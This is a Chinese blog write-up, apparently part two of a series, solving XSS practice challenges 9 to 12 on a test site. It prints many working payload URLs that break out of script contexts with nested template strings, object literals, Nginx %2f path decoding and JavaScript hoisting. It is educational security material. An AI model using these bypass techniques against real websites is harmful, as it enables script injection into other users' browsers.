<li>用于多行注释的<code>反引号</code></li>
<li>必须拥有的突破script标签的：<code>&lt;!--&lt;script &gt;</code>：可以放在后面反引号中，也可以放前面单引号的闭合里面。</li>
<li>同时需要提前注意在第三行第四行存在长度限制，我们是可以利用长度限制，去吃掉我们payload后面不想要的字符的。</li>
</ul>
<p>接下来来根据当前环境确定payload中需要拥有的<code>反引号</code>数量，这很关键，其实我们可以直接从闭合角度去确认数量，而不是无脑尝试，根据第一个跟第二个闭合，第三个跟第四个闭合的语法，可以分成两种情况：</p>
<ol>
<li>payload中引入偶数个反引号：这明显不可能，因为偶数个的话在输出点就会行程，本行跟本行的闭合跟我们设想的跨行闭合背道而驰，直接PASS</li>
<li>payload中引入奇数个反引号：1，3，5，奇数个反引号会现在内部闭合，留下一个单引号到下一行闭合，这样就形成了跨行。但是我们会发现奇+奇=偶，这样前两行就会完成全部的闭合，第二行到第三行中间乱七八糟的字符就只能暴露出来，形成报错。相当于能跨行，但是幅度还是不够。</li>
</ol>
<pre><code>http://px1624.sinaapp.com/test/xsstest9/?px=\'-`&lt;!--&lt;script%20&gt;

payload:\'-`&lt;!--&lt;script &gt;
</code></pre>
<figure data-type="image" tabindex="16"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuiby7n1mj30wq0admyn.jpg" alt="9-0.png" loading="lazy"></figure>
<h3 id="模板字符串的嵌套">模板字符串的嵌套</h3>
<p>跨行幅度不够，跨行幅度不够，其实我们就是烦恼模板字符串的匹配跟<code>()、{}</code>这类的不一样，结束太早了。</p>
<p>其实可以使用：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings"><strong>模板字符串的嵌套</strong></a></p>
<pre><code class="language-JS">`abc${`def`}`
//abcdef
</code></pre>
<p>发现所需要用到的<strong>反引号</strong>、<strong>$</strong>、<strong>{</strong>、**}**恰好均不会被注释，很棒，进行尝试，老样子先定闭合，我们有4行输出，想到两种闭合形式：</p>
<ul>
<li><strong>递归闭合</strong>，即第一行的第一个前反引号，到最后一行的最后一个后引号才完成闭合，整个行程一个整体</li>
<li><strong>前后行闭合</strong>，即这行的前反引号，在后一行的开头即闭合，上下行行程闭环。</li>
</ul>
<p>我们先看一下递归分析：</p>
<pre><code class="language-JS">`abc${ `d${ `e${ `f` }` }` }`
//abcdef
//左反引号4个，右反引号4个
//左开口3个，右闭口3个
</code></pre>
<p>根据各行的特性，大致拟定下左侧开口和闭合数量，</p>
<pre><code>闭合  开口
0      3   //利用单引号作为字符串解析吃掉闭合
2      3
2      0   //利用长度截断吃掉开口
2      0   //利用长度截断吃掉开口
</code></pre>
<p>尝试测试：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest9/?px=`}`}\'-`&lt;!--&lt;script%20&gt;${`${`${`

payload:`}`}\'-`&lt;!--&lt;script &gt;${`${`${`
</code></pre>
<figure data-type="image" tabindex="17"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuic5xr2tj30x70aiabg.jpg" alt="9-1.png" loading="lazy"></figure>
<p>问题在第二行直接暴露，我们只考虑左右闭合的话，<strong>中间的语法问题根本没法解决</strong>。</p>
<p>同时也可以知道因为反引号数量是比开头闭口数量要多的，上一行的开头左反引号进入到下一行会打乱布局。</p>
<p>我们换<strong>前后行闭合</strong>的思路尝试解决这个问题：</p>
<p>前后行闭合：</p>
<pre><code class="language-js">`abc${`
`}`-`abc${`
`}`-`abc${`
`}`-`abc${` //最后一行好像有问题到时候再说
</code></pre>
<p>测试到头也只能如下：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest9/?px=\'-`}`-`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="18"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuiccmyz5j30ud09jgmq.jpg" alt="9-2.png" loading="lazy"></figure>
<p>出现了最后一行的问题最后的语法没法闭合，尝试用长度去截断：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest9/?px=\'-`}111111111111111`-`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="19"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuici9m6dj30r40a175c.jpg" alt="9-4.png" loading="lazy"></figure>
<blockquote>
<p>这里会发现闭合关系结合了我们之前的<strong>递归闭合</strong>和<strong>上下行闭合</strong></p>
</blockquote>
<p>闭合了，但是出现了我们没法在大括号这里写入语句，简而言之就是<strong>多出了一个大括号</strong>。</p>
<p>其实我们在梳理闭合反引号和闭合大括号数量的时候就发现了这个<strong>数量不一致</strong>的问题，最后会导致语法错误。</p>
<p>所以我们必须要引入什么其他语法结构来闭合大括号。</p>
<h3 id="函数-语法-对象闭合大括号">函数、语法、对象闭合大括号</h3>
<p><code>function(){}</code>、<code>if(){}</code>、<code>{a:123}</code>，出题者WP给出了JS语法中三种闭合大括号的方式。由于前两者会引入一些语法结构问题，而对象会比较简单，也可以作为表达式的一部分。所以选取<strong>对象结构</strong>来进行括号填补。</p>
<p>至此 构建payload的所有要素就齐全了，引入对象，把右边的模板字符串写成对象的形式好了：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest9/?px=\'-`}111111111111111`-{a:`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="20"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuicmzcg7j30tt09e3zm.jpg" alt="9-5.png" loading="lazy"></figure>
<p>前面没有报错！在报错的地方引入payload！</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest9/?px=\'-`}-alert(1)//1111`-{a:`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="21"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuicqr01xj30t509ijso.jpg" alt="9-6.png" loading="lazy"></figure>
<p>成了成了！下面这些报错不重要！！因为如同之前所说的<code>&lt;script&gt;'px'</code>标签会被解析为小于 script这个变量大于'px'，大概如下，虽然会执行报错但是解析是正确的，就可以执行成功。</p>
<pre><code class="language-JS">var px=''-alert(1)&lt;script&gt;'px'
</code></pre>
<p>拉过去浏览器！失败....没弹框.....</p>
<p>仔细看看代码会发现存在一个闭合问题：</p>
<figure data-type="image" tabindex="22"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuid1hcjoj31bg0flgr4.jpg" alt="9-flase.png" loading="lazy"></figure>
<p>那么在这个位置加上闭合，那么考虑第一行的语法情况，在前面也需要把大括号闭合了，再引入一个对象：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest9/?px=\'-{a:`}-alert(1)//1111`}-{a:`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="23"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuicvv6qsj30uo09omyi.jpg" alt="9-7.png" loading="lazy"></figure>
<p>成了！！！！！！！！</p>
<figure data-type="image" tabindex="24"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuid8d05dj31ii0dkq3n.jpg" alt="9-8.png" loading="lazy"></figure>
<p>看了下发现跟官方WP的答案如出一辙.....不亏虽然没看答案但是一路偷看思路的我....</p>
<p>看看其他老哥的WP：</p>
<pre><code>Huuu:
http://px1624.sinaapp.com/test/xsstest9/?px=1111111111111111`}//`-alert(1)-{a:`${`\%27-`}${`%3C!--%3Cscript%20%3E
//这个payload有一点类似，想办法只因入了一个对象，就不存在我们之前以为闭合成功了，然后再加一个对象的那一步
香草：
http://px1624.sinaapp.com/test/xsstest9/?px=`}-alert(1)//`}-{a:`${`\%27-{a:`}${`%3C!--%20%3Cscript%20%3E 
</code></pre>
<h2 id="第十题">第十题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest10/</p>
<pre><code class="language-html">&lt;script&gt;
var px='12345';
var px1624='12345';
&lt;/script&gt;
give me xss by pass~10
&lt;div style=&quot;display:none&quot;&gt;12&lt;/div&gt;
&lt;div style=&quot;display:none&quot;&gt;12345&lt;/div&gt;
&lt;!--px--&gt;
&lt;script&gt;
&quot;px&quot;
&lt;/script&gt;
</code></pre>
<p>知识点：</p>
<ul>
<li>延续之前知识点，知识构造方法不同，没有新知识点</li>
</ul>
<p>跟之前的应该变化不大，先用之前的payload探探路：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest10/?px=\'-{a:`}-alert(1)//1111`}-{a:`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="25"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuide3o9bj314u0c2mym.jpg" alt="10-0.png" loading="lazy"></figure>
<p>发现有以下改变：</p>
<ul>
<li>第三处限制输出2个字符</li>
<li>第四处不限制输出字符数</li>
</ul>
<p>仔细观察第九题的payload输出结果，会发现当前payload输出实际上变成了<strong>同一个payload在三个地方输出，知识第三个地方的过滤规则跟之前两处不同</strong>，前面是转义，后面是html编码</p>
<p>这种情景就陷入了我们之前说的<strong>三行之间前后行闭合</strong>的情况：</p>
<pre><code class="language-JS">''-{a:``}-{a:`${`
       `}`}-{a:`${`
	   `}`}-{a:`${`
</code></pre>
<p>之前的前后行闭合还可以使用<strong>长度截断</strong>来<strong>改变最后语法</strong>，从而突破。但是这里我们没法动，因为我们只要改动payload，想在第三行正常结束，那么他就会在第二行结束。因为两者输出是一样的。</p>
<p>也不是完全一样的，因为这两者之间<strong>过滤规则不同</strong>。</p>
<p>那么我们是否可以找到一个payload，利用过滤规则，让JS第二行正常闭合，开启，但是在第三行完成语法修正，比如..注释符？</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest10/?px=\'-{a:`}-alert(1)//1111`}//-{a:`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="26"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuidhrr4jj314x0afq4g.jpg" alt="10-1.png" loading="lazy"></figure>
<p>怎么尝试都不可以，为了语法正确，都只能在已有对象之外加入注释符，但是这些被转移的注释符都会在前两行出错。</p>
<h3 id="让截断处起到改变语法的作用">让截断处起到改变语法的作用</h3>
<p>换条思路，我们的目的就是为了<strong>让第四行改变语法</strong>，想办法利用起第三行的被截取的两个字符来<strong>改变语法</strong>。</p>
<p><strong>比如提前闭合对象，从而释放出之后的第四行的原来被关在模板字符串里面的注释符//</strong>。</p>
<p>那么我们的payload就要以<code>反引号}</code>开头，根据这个要求修改payload再把弹框和占位都去掉，看一下：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest10/?px=`}\'-{a:`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="27"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuie1h1joj30zf0bmwfr.jpg" alt="10-2.png" loading="lazy"></figure>
<p>为了第二行的语法正确，我们可以再引入一个嵌套的模板字符串，把<strong>单引号</strong>放入到模板字符串中</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest10/?px=`}\'-{a:`${`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="28"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuie6bsbmj30xq0bfdh2.jpg" alt="10-3.png" loading="lazy"></figure>
<p>右边加了开口，但是左边没有加闭口，在报错位置加上闭口</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest10/?px=`}\'-{a:`}-${`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="29"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuihuapb0j30ze0bt0u0.jpg" alt="10-4.png" loading="lazy"></figure>
<p>第三行的闭合符号将语法提前闭合！导致后面报错，那么引入注释符！</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest10/?px=`}\'-{a:`}-//${`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="30"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuifhsu9lj313f0bowfu.jpg" alt="10-5.png" loading="lazy"></figure>
<p>最后引入弹框语句！</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest10/?px=`}\%27-{a:`}-alert(1)//${`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="31"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuifmv1uyj31gl0bsjs1.jpg" alt="10-6.png" loading="lazy"></figure>
<p>舒服了——舒服了——舒服了！</p>
<p>看看其他师傅payload：</p>
<pre><code>出题人WP：
http://px1624.sinaapp.com/test/xsstest10/?px=`}\%27-{a:`}-alert(1)//`}-{a:`${`${`&lt;!--&lt;script%20&gt;
跟我的不一样，好像好像我的比他要好一点？
香草：
http://px1624.sinaapp.com/test/xsstest8/?px=`}-alert(1)//&lt;/script&gt;`}-{a:`${`\%27-{a:`}${`&lt;!--&lt;script%20&gt;
使用的是第一行一处嵌套，第二行两处嵌套的方式，思路有点不通
Huuu：
http://px1624.sinaapp.com/test/xsstest10/?px=`}//`-alert(1)-{a:`${`\%27-`}${`&lt;!--&lt;script%20&gt;
非常骚气的姿势
</code></pre>
<p>但是我不管我不听我不听，我的payload是最短的43个字符，假装很厉害QAQ</p>
<h2 id="第十一题">第十一题</h2>
<blockquote>
<p>十一十二题，应该参考于<a href="https://renwax23.github.io/X/chal/oct22/">国外老哥的题目</a>，payload参考原题解，最短payload参考huuu</p>
</blockquote>
<p>题目：http://px1624.sinaapp.com/test/xsstest11/</p>
<pre><code class="language-html">&lt;h3&gt;alert(11) to win&lt;/h3&gt;
&lt;br&gt;
&lt;script&gt;
eval(location.pathname)
&lt;/script&gt;
</code></pre>
<p>知识点：</p>
<ul>
<li>使用%2f让浏览器不会吞掉多余路径</li>
</ul>
<p>eval执行<code>location.pathname</code>，直接输出看下location的内容：</p>
<pre><code class="language-js">// http://px1624.sinaapp.com/test/xsstest11/
location.pathname
// /test/xsstest11/
eval(&quot;/test/xsstest11/&quot;)
// 报错Invalid regular expression flags 正则表达式语法无效
</code></pre>
<p>JS语法把里头的路径当作JS解析了，由于<code>/</code>开头，被当作正则表示式。在构造payload时，我们就需要同时考虑JS语法正确跟URL路径正确。</p>
<p>根据前面几题的经验，这边就可以处理成<strong>一个正则表达式的表达式运算</strong>，添加一个<code>/</code>，然后再路由回来：</p>
<pre><code class="language-js">// http://px1624.sinaapp.com/test//xsstest11/alert(1)/../
/test//xsstest11/alert(1)/../
一个正则表达式，除以xsstest11这个变量,除以alert方法，然后由于多了一个alert路径，添加../路由回来
</code></pre>
<p>但看这个思路的话会存在一个<strong>变量问题</strong>(xsstest11未赋值)，然后拉去浏览器一访问，会发现另一个更严重的问题：<strong>我们写入的<code>alert(1)/../</code>没了。</strong></p>
<p>再抓包看，会发现我们的<code>alert(1)/../</code>直接被浏览器吃了，压根没出现在数据包里。我们首先要解决之后的payload不会被浏览器吃的问题，不然我们根本没法往后加东西。</p>
<h3 id="2f突破浏览器作妖">%2f突破浏览器作妖</h3>
<p>根据<strong>浏览器不URL解码%2f</strong>，而<strong>NGINX服务器会把URL编码<code>%2f</code>解码为<code>/</code>的特性差</strong>来进行绕过。</p>
<blockquote>
<p>只有NGINX服务器会解码URL，IIS/APACHE服务器不会解码。<a href="http://blog.phpdr.net/nginx-auto-decode.html">参考1</a>、<a href="https://stackoverflow.com/questions/8264239/nginx-unescapes-2f-to-a-forward-slash-how-can-i-stop-it">参考2</a></p>
</blockquote>
<p>只需要把<code>/</code>编码成<code>%2f</code>即可绕过（第一次做的时候，直接这个地方就趴下死了）</p>
<figure data-type="image" tabindex="32"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuifz3bhmj311p0ksdhi.jpg" alt="11-1.png" loading="lazy"></figure>
<p>然后根据报错慢慢修改，这里<code>..%2f</code>语法报错了，注释掉，再修改payload：</p>
<pre><code>http://px1624.sinaapp.com/test//xsstest11/alert(1)//..%2f..%2f
</code></pre>
<figure data-type="image" tabindex="33"><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gl3tb9weggj311u07pdg6.jpg" alt="11-22.png" loading="lazy"></figure>
<blockquote>
<p>额外讨论 //和..%2f的问题：数一数url中的<code>//</code>和<code>..%2f</code></p>
<p>我们会发现如果把<code>//</code>理解为我们理想中的<strong>原目录原地跳</strong>就会发现多了一个<code>..%2f</code>，什么地方不对劲。</p>
<p>假设服务器把<code>//</code>理解成一个子目录，需要往上层跳，会发现也不对劲，2个<code>//</code>一个<code>/alert(1)/</code>一共是多了三个子目录，但是我们只有2个<code>..%2f</code></p>
<p>测试：</p>
<p>http://px1624.sinaapp.com/test////xsstest11/alert(1)//..%2f..%2f 可以正常访问</p>
<p>http://px1624.sinaapp.com/test////xsstest11/alert(1)///..%2f..%2f 无法访问</p>
<ul>
<li>在明文路径（如/xsstest11/）左侧的<code>//</code>解释为原地跳</li>
<li>在最后的明文路径（如/alert(1)）右侧的<code>//</code>理解为子目录，非常的神奇</li>
</ul>
<p>但是规律应该不是通用的。</p>
</blockquote>
<p>来到了变量没定义这一关，看似死局，因为我们没法修改前面的路由</p>
<p>............？？？？？？？</p>
<p>好像完全可以修改前面的路由，然后注释后面的全部代码，利用<code>..%2f</code>再构造正常路由就可以了：</p>
<pre><code>http://px1624.sinaapp.com/1/;alert(11)//test/xsstest11/..%2f..%2f..%2f..%2f..%2f/test/xsstest11/
</code></pre>
<p>一个理应正确的payload，但是却返回400，经过测试，发现只要我们企图<code>../</code>到根目录就会报错，那么只需要把test提前到前面就可以了。</p>
<pre><code>http://px1624.sinaapp.com/test/;alert(11)//test/xsstest11/..%2f..%2f..%2f..%2f/xsstest11/
</code></pre>
<p>再精简下，payload：</p>
<pre><code>http://px1624.sinaapp.com/test/;alert(11)//..%2f..%2f/xsstest11/
</code></pre>
<figure data-type="image" tabindex="34"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuig70vnsj31h60bxgm5.jpg" alt="11-success.png" loading="lazy"></figure>
<p>然后px1642大哥又帮我精简了一个%2f.....<code>..%2f</code>一路复制粘贴毁一生</p>
<pre><code>http://px1624.sinaapp.com/test/;alert(11)//..%2f../xsstest11/
</code></pre>
<h2 id="第十二题">第十二题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest12/</p>
<pre><code class="language-html">&lt;h3&gt;alert(12) to win&lt;/h3&gt;
&lt;br&gt;
&lt;script&gt;
if(/\/xsstest12\//.test(location.pathname.substr(0,17))){
eval(location.pathname)
}
&lt;/script&gt;
</code></pre>
<p>知识点：</p>
<ul>
<li>JS语言声明变量时变量提升的特性</li>
<li>var的另一种赋值方式</li>
</ul>
<p>新增了一个正则，要求我们的路由前17位必须包含<code>/xsstest12/</code></p>
<pre><code class="language-JS">// http://px1624.sinaapp.com/test/xsstest12/

location.pathname
&quot;/test/xsstest12/&quot;
location.pathname.length
16
</code></pre>
<p>原本路由是16字节，现在要求17个字节，明显是让我们加入一个<code>/</code>来满足JS语法正确</p>
<p>相当于又回到了十一题的我们一开始讨论的情况，就是前面不允许我们加东西，只允许在后面填充，并且要求满足JS语法。</p>
<p>回到了解决<strong>xsstest12变量不存在</strong>的问题</p>
<h3 id="变量提升特性">变量提升特性</h3>
<p>通常而言我们知道，一个变量应该先声明，后使用，假如不这样就会被教做人，比如python：</p>
<figure data-type="image" tabindex="35"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigcebguj313a0fzjsm.jpg" alt="11-0.png" loading="lazy"></figure>
<p>而JS却不是，参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Grammar_and_types#%E5%A3%B0%E6%98%8E">说明</a>：</p>
<blockquote>
<p>JavaScript 变量的另一个不同寻常的地方是，你可以先使用变量稍后再声明变量而不会引发异常。这一概念称为变量提升；JavaScript 变量感觉上是被“提升”或移到了函数或语句的最前面。但是，提升后的变量将返回 undefined 值。因此在使用或引用某个变量之后进行声明和初始化操作，这个被提升的变量仍将返回 undefined 值。</p>
</blockquote>
<p>那么实际上只需要在后面继续声明变量就可以了：</p>
<pre><code class="language-JS">/test//xsstest11/alert(23);var xsstest11=1;//..%2f..%2f..%2f..%2f
</code></pre>
<figure data-type="image" tabindex="36"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigi2w9aj31kd0dvmyc.jpg" alt="12-1.png" loading="lazy"></figure>
<p>但是<code>var xsstest12</code>这个地方的空格在URL中会被编码成%20，然后传入JS中。JS是无法解析的。</p>
<p><strong>JS中替代空格</strong>，换一下变成注释符<code>/**/</code>，然后补齐路由即可：</p>
<pre><code>http://px1624.sinaapp.com/test//xsstest12/alert(23);var/**/xsstest12=1;//..%2f..%2f..%2f..%2f
</code></pre>
<figure data-type="image" tabindex="37"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigolcooj31l509p74y.jpg" alt="12-2.png" loading="lazy"></figure>
<h3 id="企图简短payload">企图简短payload</h3>
<p>当然我们还可以进一步精简payload，比如不注释，而是后面这部分也利用起来变成正则表达式变量进行赋值：</p>
<pre><code class="language-js">// http://px1624.sinaapp.com/test//xsstest12/alert(23);var/**/xsstest12=/..%2f..%2f..%2f/
location.pathname.length
68
</code></pre>
<figure data-type="image" tabindex="38"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigsgze5j31gb0acgm8.jpg" alt="12-3.png" loading="lazy"></figure>
<p>进一步简短，就要从赋值入手了。</p>
<h4 id="vara1-解构赋值">var[a]=[1] 解构赋值</h4>
<p>非常神奇的赋值方式：</p>
<figure data-type="image" tabindex="39"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigwj9k1j30ip0b4wem.jpg" alt="12-4.png" loading="lazy"></figure>
<p>尝试过在各个网站领域 去搜索这种赋值方式，但是没有收获，决定厚着脸皮去问下原题作者：</p>
<figure data-type="image" tabindex="40"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuiha9qhij30xp0s6ae5.jpg" alt="12-1-0.png" loading="lazy"></figure>
<p>emmm.....</p>
<p>又跟px1642老哥交流了下，发现官方其实有这种赋值方式的说明..............叫做<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment">解构赋值</a>：</p>
<pre><code class="language-JS">//数组
var a, b, rest;
[a, b] = [10, 20];
console.log(a); // 10
console.log(b); // 20
//对象

//甚至可以省略var
({ c, d } = { c: 10, d: 20 });
console.log(c); // 10
console.log(d); // 20

//然后我们省略这个空格,就形成了
var[a,b]=[1,2]
//命令行中可以这么无var赋值，但是测试无法正常变量提升
([c,d]=[3,4])
({e,f}={e:5,f:6})
</code></pre>
<pre><code class="language-js">// http://px1624.sinaapp.com/test//xsstest12/alert(23);var[xsstest12]=[]//..%2f..%2f/

location.pathname
&quot;/test//xsstest12/alert(23);var[xsstest12]=[]//..%2f..%2f/&quot;
location.pathname.length
57
</code></pre>
<figure data-type="image" tabindex="41"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuih3retqj31h309kgm7.jpg" alt="12-5.png" loading="lazy"></figure>
<p>进一步缩短，虽然会运行报错，但是不影响</p>
<pre><code class="language-js">// http://px1624.sinaapp.com/test//xsstest12/alert(23);var[xsstest12]=/..%2f/

location.pathname
&quot;/test//xsstest12/alert(23);var[xsstest12]=/..%2f/&quot;
location.pathname.length
49
</code></pre>
<figure data-type="image" tabindex="42"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuihgz8klj31hv09ejry.jpg" alt="12-6.png" loading="lazy"></figure>
<p>噢..好像是弹12...但是这不重要emmm</p>
<h2 id="参考">参考</h2>
<ol>
<li>https://mp.weixin.qq.com/s/MNP1PW0bi0aL7dRr1aa2Tg</li>
<li>https://mp.weixin.qq.com/s/T44dQckTjc0M1loRzTRH0A</li>
<li>https://mp.weixin.qq.com/s/jx-UWFfSPOVPhWLsvGxPcw</li>
<li>https://mp.weixin.qq.com/s/Q976z2ryfkEJQiSyl8aH8g</li>
<li>https://mp.weixin.qq.com/s/Nxjn_SUAfrB-K5z6YdlW8g</li>
</ol>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
<li><a href="#%E7%AC%AC%E4%B8%83%E9%A2%98">第七题</a>
<ul>
<li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87">字符串中的<code>\</code>转义绕过</a></li>
<li><a href="#5%E7%A7%8D%E6%96%B9%E6%B3%95%E5%B0%9D%E8%AF%95%E9%97%AD%E5%90%88">5种方法尝试闭合</a></li>
<li><a href="#-%E6%A0%87%E7%AD%BE%E7%AA%81%E7%A0%B4script%E6%A0%87%E7%AD%BE">&lt;!-- 标签突破script标签</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E5%85%AB%E9%A2%98">第八题</a>
<ul>
<li><a href="#%E5%A4%9A%E6%AC%A1%E7%AA%81%E7%A0%B4script%E6%A0%87%E7%AD%BE">多次突破script标签</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E8%B0%B7%E6%AD%8Cxss%E8%BF%87%E6%BB%A4%E5%99%A8-xssauditor">绕过谷歌XSS过滤器-XSSAuditor</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%80%9D%E8%B7%AF">使用模板字符串的思路</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E4%B9%9D%E9%A2%98">第九题</a>
<ul>
<li><a href="#%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B5%8C%E5%A5%97">模板字符串的嵌套</a></li>
<li><a href="#%E5%87%BD%E6%95%B0-%E8%AF%AD%E6%B3%95-%E5%AF%B9%E8%B1%A1%E9%97%AD%E5%90%88%E5%A4%A7%E6%8B%AC%E5%8F%B7">函数、语法、对象闭合大括号</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E5%8D%81%E9%A2%98">第十题</a>
<ul>
<li><a href="#%E8%AE%A9%E6%88%AA%E6%96%AD%E5%A4%84%E8%B5%B7%E5%88%B0%E6%94%B9%E5%8F%98%E8%AF%AD%E6%B3%95%E7%9A%84%E4%BD%9C%E7%94%A8">让截断处起到改变语法的作用</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E9%A2%98">第十一题</a>
<ul>
<li><a href="#2f%E7%AA%81%E7%A0%B4%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%9C%E5%A6%96">%2f突破浏览器作妖</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E9%A2%98">第十二题</a>
<ul>
<li><a href="#%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87%E7%89%B9%E6%80%A7">变量提升特性</a></li>
<li><a href="#%E4%BC%81%E5%9B%BE%E7%AE%80%E7%9F%ADpayload">企图简短payload</a>
<ul>
<li><a href="#vara1-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC">var[a]=[1] 解构赋值</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://blog.xray.cool/post/12cases-about-xss-part1/">
              <h3 class="post-title">
                十二个案例重新认识 XSS (上)
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  
  <a class="rss" href="https://blog.xray.cool/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
